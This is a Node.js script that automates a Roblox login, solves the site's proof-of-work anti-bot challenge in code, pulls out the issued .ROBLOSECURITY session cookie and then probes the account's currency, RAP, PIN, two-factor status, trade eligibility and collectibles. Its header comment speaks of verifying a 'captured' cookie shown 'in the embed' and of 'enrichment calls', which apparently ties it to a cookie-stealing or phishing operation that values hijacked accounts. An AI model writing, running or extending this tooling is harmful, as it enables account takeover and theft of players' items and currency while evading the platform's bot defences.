/**
 * Prove the captured .ROBLOSECURITY is real, then time the enrichment calls.
 *
 * Runs the full login handshake, takes the issued cookie straight to Roblox's
 * authenticated endpoints, and prints status + latency for each. If these 200,
 * the cookie in the embed is live, not decoration.
 */

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

const USER = process.argv[2] || 'indefinitetesting';
const PASS = process.argv[3] || 'charizardx';

const jar = new Map();
const absorb = res => {
    const list = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
    for (const raw of list) {
        const pair = raw.split(';')[0];
        const i = pair.indexOf('=');
        if (i > 0) jar.set(pair.slice(0, i).trim(), pair.slice(i + 1).trim());
    }
};
const cookieHeader = () => [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');

async function login(csrf, extra = {}) {
    const headers = {
        'User-Agent': UA,
        'Content-Type': 'application/json',
        Accept: 'application/json, text/plain, */*',
        Origin: 'https://www.roblox.com',
        Referer: 'https://www.roblox.com/login',
        Cookie: cookieHeader(),
        ...extra
    };
    if (csrf) headers['X-CSRF-TOKEN'] = csrf;
    const res = await fetch('https://auth.roblox.com/v2/login', {
        method: 'POST',
        headers,
        body: JSON.stringify({ ctype: 'Username', cvalue: USER, password: PASS })
    });
    absorb(res);
    return res;
}

function vdf(A, N, T) {
    let acc = A % N;
    for (let i = 0; i < T; i++) acc = (acc * acc) % N;
    return acc;
}

async function postWithCsrf(url, body, csrf) {
    const send = async token => {
        const headers = {
            'User-Agent': UA,
            'Content-Type': 'application/json',
            Accept: 'application/json',
            Origin: 'https://www.roblox.com',
            Referer: 'https://www.roblox.com/login',
            Cookie: cookieHeader()
        };
        if (token) headers['X-CSRF-TOKEN'] = token;
        const r = await fetch(url, { method: 'POST', headers, body: JSON.stringify(body) });
        absorb(r);
        return r;
    };
    let res = await send(csrf);
    if (res.status === 403) {
        const fresh = res.headers.get('x-csrf-token') || csrf;
        await res.text();
        res = await send(fresh);
    }
    return res;
}

(async () => {
    let res = await login(null);
    const csrf = res.headers.get('x-csrf-token');
    await res.text();

    res = await login(csrf);
    const challengeId = res.headers.get('rblx-challenge-id');
    const metaRaw = res.headers.get('rblx-challenge-metadata');
    await res.text();
    const meta = JSON.parse(Buffer.from(metaRaw, 'base64').toString('utf8'));

    const pRes = await fetch(
        `https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle?urlLocale=en_us&sessionID=${encodeURIComponent(meta.sessionId)}`,
        { headers: { 'User-Agent': UA, Accept: 'application/json, text/plain, */*' } }
    );
    const art = JSON.parse((await pRes.json()).artifacts);
    const solution = String(vdf(BigInt(art.A), BigInt(art.N), Number(art.T)));

    const vRes = await postWithCsrf(
        'https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle',
        { sessionID: meta.sessionId, solution },
        csrf
    );
    const { redemptionToken } = await vRes.json();

    const challengeMetadata = JSON.stringify({ redemptionToken, sessionId: meta.sessionId });
    await postWithCsrf(
        'https://apis.roblox.com/challenge/v1/continue',
        { challengeId, challengeType: 'proofofwork', challengeMetadata },
        csrf
    ).then(r => r.text());

    res = await login(csrf, {
        'rblx-challenge-id': challengeId,
        'rblx-challenge-type': 'proofofwork',
        'rblx-challenge-metadata': Buffer.from(challengeMetadata, 'utf8').toString('base64')
    });
    await res.text();

    const issued = (res.headers.getSetCookie ? res.headers.getSetCookie() : [])
        .find(c => c.includes('.ROBLOSECURITY='));
    if (!issued) {
        console.log('no cookie issued');
        return;
    }
    const cookie = issued.match(/\.ROBLOSECURITY=([^;]+)/)[1];
    console.log(`cookie ${cookie.length} chars\n`);

    const probes = [
        ['authenticated', 'https://users.roblox.com/v1/users/authenticated'],
        ['currency', 'https://economy.roblox.com/v2/users/11793330413/currency'],
        ['rap', 'https://economy.roblox.com/v1/users/11793330413/rap'],
        ['pin', 'https://auth.roblox.com/v2/users/pin'],
        ['2fa', 'https://twofactorauth.roblox.com/v1/users/two-factor/status'],
        ['premium', 'https://premiumfeatures.roblox.com/v1/users/11793330413/membership'],
        ['can-trade', 'https://trades.roblox.com/v1/users/11793330413/can-trade'],
        ['collectibles', 'https://inventory.roblox.com/v1/users/11793330413/assets/collectibles?limit=10'],
        ['friends', 'https://friends.roblox.com/v1/users/11793330413/friends/count']
    ];

    for (const [label, url] of probes) {
        const t0 = Date.now();
        try {
            const r = await fetch(url, {
                headers: {
                    'User-Agent': UA,
                    Accept: 'application/json',
                    Cookie: `.ROBLOSECURITY=${cookie}`
                },
                signal: AbortSignal.timeout(20000)
            });
            const body = (await r.text()).slice(0, 150);
            console.log(`${label.padEnd(13)} ${String(r.status).padEnd(4)} ${String(Date.now() - t0 + 'ms').padEnd(7)} ${body}`);
        } catch (e) {
            console.log(`${label.padEnd(13)} ERR  ${Date.now() - t0}ms  ${e.message}`);
        }
    }
})().catch(e => console.error('FATAL', e));
